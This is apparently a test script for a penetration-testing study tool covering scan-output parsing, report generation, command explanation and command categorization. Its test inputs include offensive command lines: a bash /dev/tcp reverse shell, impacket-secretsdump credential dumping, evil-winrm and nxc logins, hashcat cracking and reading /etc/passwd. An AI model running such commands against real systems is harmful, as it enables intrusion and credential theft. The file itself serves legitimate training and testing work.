/* Standalone verification of the core decision logic (spec §9, §32).
   Bundled with esbuild and run under node — no browser needed. */
import { analyzeOutput } from "../src/engine/parsers";
import { generateReport } from "../src/lib/report";
import { lookupPort } from "../src/content/ports";
import { serviceModuleForPort } from "../src/content/services";
import { searchContent } from "../src/content/searchIndex";
import type { Assessment } from "../src/types";

let pass = 0;
let fail = 0;
function check(name: string, cond: boolean, extra?: string) {
  if (cond) {
    pass++;
    console.log(`  ✓ ${name}`);
  } else {
    fail++;
    console.log(`  ✗ ${name}${extra ? ` — ${extra}` : ""}`);
  }
}

console.log("\n== Scenario: paste the 3-service nmap result ==");
const nmap = `22/tcp open ssh\n80/tcp open http\n445/tcp open microsoft-ds`;
const r = analyzeOutput(nmap);

check("parser is nmap", r.parser === "nmap", r.parser);
check("headline reports 3 open services", /3 open services/.test(r.headline ?? ""), r.headline);
const svcObs = r.observations.filter((o) => o.service);
check("identified exactly 3 services", svcObs.length === 3, `got ${svcObs.length}`);
check("recorded SSH on 22", svcObs.some((o) => o.service!.port === 22));
check("recorded HTTP on 80", svcObs.some((o) => o.service!.port === 80));
check("recorded SMB on 445", svcObs.some((o) => o.service!.port === 445));

const svcSuggestions = r.suggestions.filter((s) => s.goto.type === "service");
check("suggests HTTP enumeration", svcSuggestions.some((s) => s.goto.id === "http"));
check("suggests SMB enumeration", svcSuggestions.some((s) => s.goto.id === "smb"));
check("suggests SSH enumeration", svcSuggestions.some((s) => s.goto.id === "ssh"));
check("has a non-fabrication caveat", !!r.caveat && /not a vulnerability/i.test(r.caveat));
check("never invents a vulnerability", !JSON.stringify(r).toLowerCase().includes("cve-"));

console.log("\n== Port + service mapping ==");
check("445 → SMB module", serviceModuleForPort(445)?.id === "smb");
check("port 445 lookup is SMB", lookupPort(445)?.service === "SMB");
check("port 3389 → RDP module", serviceModuleForPort(3389)?.id === "rdp");

console.log("\n== AD DC signature detection ==");
const dc = analyzeOutput(`53/tcp open domain\n88/tcp open kerberos-sec\n389/tcp open ldap\n445/tcp open microsoft-ds`);
check("flags likely Domain Controller", dc.suggestions.some((s) => /domain controller/i.test(s.label)));

console.log("\n== Linux sudo -l parsing ==");
const sudo = analyzeOutput(`uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find`);
check("linux parser matched", sudo.parser === "linux", sudo.parser);
check("detects passwordless sudo", sudo.observations.some((o) => /Passwordless sudo/i.test(o.label)));
check("routes to sudo lesson", sudo.suggestions.some((s) => s.goto.id === "lin-sudo"));

console.log("\n== Windows priv parsing ==");
const win = analyzeOutput(`SeImpersonatePrivilege            Enabled`);
check("windows parser matched", win.parser === "windows", win.parser);
check("flags SeImpersonate path", win.observations.some((o) => /SeImpersonate/i.test(o.label)));

console.log("\n== Search index ==");
check("search '445' finds SMB", searchContent("445").some((i) => /smb/i.test(i.title + i.subtitle)));
check("search 'SUID' finds content", searchContent("SUID").length > 0);
check("search 'nmap' finds content", searchContent("nmap").length > 0);

console.log("\n== Report generation from data (no invention) ==");
const now = new Date().toISOString();
const a: Assessment = {
  id: "t1", name: "Test", environment: "htb", startingPoint: "new",
  scope: { authorizedTargets: "10.10.10.10", authorized: true },
  asset: { id: "x", ip: "10.10.10.10", os: "linux" },
  currentPhase: "enumeration",
  phases: [], services: [
    { id: "s1", port: 80, protocol: "tcp", service: "http", status: "open", createdAt: now },
  ],
  notes: [], findings: [
    { id: "f1", title: "SQLi in login", severity: "high", status: "validated", createdAt: now, updatedAt: now },
  ],
  history: [], timeline: [], evidence: [], credentials: [],
  createdAt: now, updatedAt: now,
};
const report = generateReport(a);
check("report includes target", report.includes("10.10.10.10"));
check("report includes the finding", report.includes("SQLi in login"));
check("report includes open service", report.includes("80/tcp"));
check("report has required sections", ["Executive Summary", "Scope", "Methodology", "Findings", "Risk Summary"].every((s) => report.includes(s)));

console.log("\n== Command breakdown (flag explainer) ==");
import { explainCommandParts, commandAlternatives } from "../src/content/flags";
const dig = explainCommandParts("dig <DOMAIN> ANY +noall +answer");
const digParts = Object.fromEntries(dig.map((p) => [p.part, p.meaning]));
check("dig: explains <DOMAIN>", !!digParts["<DOMAIN>"]);
check("dig: explains ANY", /every record type/i.test(digParts["ANY"] ?? ""));
check("dig: explains +noall", !!digParts["+noall"]);
check("dig: explains +answer", !!digParts["+answer"]);

// tool-aware ambiguity: -u and -p mean different things
const ffuf = Object.fromEntries(explainCommandParts("ffuf -u http://<TARGET>/FUZZ -w list -mc all -fc 404").map((p) => [p.part, p.meaning]));
check("ffuf -u = URL", /url/i.test(ffuf["-u"] ?? ""));
check("ffuf -w = wordlist", /wordlist/i.test(ffuf["-w"] ?? ""));
check("ffuf explains FUZZ", !!ffuf["FUZZ"]);
const nxc = Object.fromEntries(explainCommandParts("nxc smb <TARGET> -u <USER> -p <PASS>").map((p) => [p.part, p.meaning]));
check("nxc -u = username (NOT url)", /username/i.test(nxc["-u"] ?? ""));
check("nxc -p = password", /password/i.test(nxc["-p"] ?? ""));
const nmapParts = Object.fromEntries(explainCommandParts("nmap -sC -sV -p22,80 <TARGET>").map((p) => [p.part, p.meaning]));
check("nmap -p = ports (NOT password)", /port/i.test(nmapParts["-p22,80"] ?? ""));
check("nmap -sV = version", /version/i.test(nmapParts["-sV"] ?? ""));

// paths must NOT be treated as flags
const findcmd = explainCommandParts("find / -perm -4000 -type f 2>/dev/null").map((p) => p.part);
check("find explains -perm", findcmd.includes("-perm"));
check("find does NOT mislabel /etc-style paths", !explainCommandParts("cat /etc/passwd").some((p) => p.part.startsWith("/etc")));

check("ffuf has an alternatives note", /gobuster|feroxbuster/i.test(commandAlternatives("ffuf -u x") ?? ""));
check("nxc alternatives mentions crackmapexec", /crackmapexec/i.test(commandAlternatives("nxc smb x") ?? ""));

console.log("\n== Phase playbook + target fill ==");
import { PLAYBOOK } from "../src/content/playbook";
import { PHASES } from "../src/content/phases";
import { fillTemplate } from "../src/lib/utils";
const allCmdIds: string[] = [];
let everyPhaseHasCmds = true;
for (const p of PHASES) {
  const pb = PLAYBOOK[p.id];
  if (!pb || pb.commands.length === 0) everyPhaseHasCmds = false;
  pb?.commands.forEach((c) => allCmdIds.push(c.id));
}
check("every phase has a playbook with commands", everyPhaseHasCmds);
check("playbook command ids are unique", new Set(allCmdIds).size === allCmdIds.length, `${allCmdIds.length} ids`);
const readyCmd = fillTemplate("nmap -Pn -sC -sV -oA nmap_initial <TARGET>", { TARGET: "10.10.10.10" });
check("target fills <TARGET> → ready command", readyCmd === "nmap -Pn -sC -sV -oA nmap_initial 10.10.10.10");
check("scanning playbook has the -p- full scan", PLAYBOOK.scanning.commands.some((c) => c.command.includes("-p-")));
check("exploitation playbook uses <YOUR_IP> (LHOST)", PLAYBOOK.exploitation.commands.some((c) => c.command.includes("<YOUR_IP>")));
check("no -oA writes into a subdir (nmap/ gotcha fixed)", !allCmdIds.length || !PLAYBOOK.scanning.commands.some((c) => /-oA nmap\//.test(c.command)));
console.log("\n== Target fill: multi-port + placeholder safety ==");
const deep = fillTemplate("nmap -p<PORTS> -sC -sV <TARGET>", { PORTS: "22,80,445", TARGET: "10.10.10.10" });
check("multiple ports fill -p<PORTS> correctly", deep === "nmap -p22,80,445 -sC -sV 10.10.10.10");
const single = fillTemplate("nmap --script <cat> -p<PORT> <TARGET>", { PORT: "22", TARGET: "10.10.10.10" });
check("<PORT> = first port", single === "nmap --script <cat> -p22 10.10.10.10");
check("<cat> stays a placeholder to fill", single.includes("<cat>"));
const empty = fillTemplate("nmap -sC -sV -oA nmap_initial <TARGET>", {});
check("empty target leaves <TARGET> (no real host injected)", empty.includes("<TARGET>"));
const undef = fillTemplate("scan <TARGET> <DOMAIN>", { TARGET: undefined, DOMAIN: undefined });
check("undefined vars leave placeholders", undef === "scan <TARGET> <DOMAIN>");
console.log("\n== A-Z reference coverage ==");
import { REFERENCE } from "../src/content/reference";
const secIds = REFERENCE.map((s) => s.id);
for (const need of ["ssh","rdp","winrm","ftp","smtp","snmp","ldap","databases","ad","revshells","pivot","metasploit"])
  check(`reference has a '${need}' section`, secIds.includes(need));
check("search 'ssh' returns results", searchContent("ssh").length > 0);
check("search 'rdp' returns results", searchContent("rdp").length > 0);
check("search 'evil-winrm' returns results", searchContent("evil-winrm").length > 0);
check("search 'reverse shell' returns results", searchContent("reverse shell").length > 0);
const allRefCmds = REFERENCE.flatMap((s) => s.entries.map((e) => e.command)).join("\n");
check("no un-fillable <U>/<P> placeholders (use <USER>/<PASS>)", !/<U>|<P>/.test(allRefCmds));
check("reference has 25+ sections (A-Z coverage)", REFERENCE.length >= 25, `${REFERENCE.length} sections`);
console.log("\n== Smart categorizer + templatize (My Commands) ==");
import { categorizeCommand } from "../src/content/categorize";
import { templatizeCommand } from "../src/lib/utils";
const cat = (c: string) => categorizeCommand(c).id;
check("nmap → scanning", cat("nmap -p- <TARGET> -T5") === "scanning");
check("sudo -l → linux-privesc", cat("sudo -l") === "linux-privesc");
check("whoami /priv → windows-privesc", cat("whoami /priv") === "windows-privesc");
check("nxc smb → smb", cat("nxc smb <TARGET> --shares") === "smb");
check("nxc ldap → active-directory", cat("nxc ldap <TARGET> -u a -p b") === "active-directory");
check("secretsdump → active-directory", cat("impacket-secretsdump dom/u:p@<TARGET> -just-dc") === "active-directory");
check("mssqlclient → database (not AD)", cat("impacket-mssqlclient u@<TARGET> -windows-auth") === "database");
check("evil-winrm → winrm", cat("evil-winrm -i <TARGET> -u a -p b") === "winrm");
check("dig axfr → dns", cat("dig axfr @<TARGET> <DOMAIN>") === "dns");
check("hashcat → passwords", cat("hashcat -m 1000 hashes rockyou.txt") === "passwords");
check("bash /dev/tcp → reverse-shell", cat("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'") === "reverse-shell");
check("http.server → file-transfer", cat("python3 -m http.server 8000") === "file-transfer");
check("ffuf → web", cat("ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>") === "web");
check("unknown → other", cat("some random note to self") === "other");
check("templatize target → <TARGET>", templatizeCommand("nmap -p- 10.10.10.10 -T5", { target: "10.10.10.10" }) === "nmap -p- <TARGET> -T5");
check("templatize lhost → <YOUR_IP>", templatizeCommand("set LHOST 10.10.14.5", { lhost: "10.10.14.5" }).includes("<YOUR_IP>"));
console.log(`\n== RESULT: ${pass} passed, ${fail} failed ==\n`);
process.exit(fail === 0 ? 0 : 1);
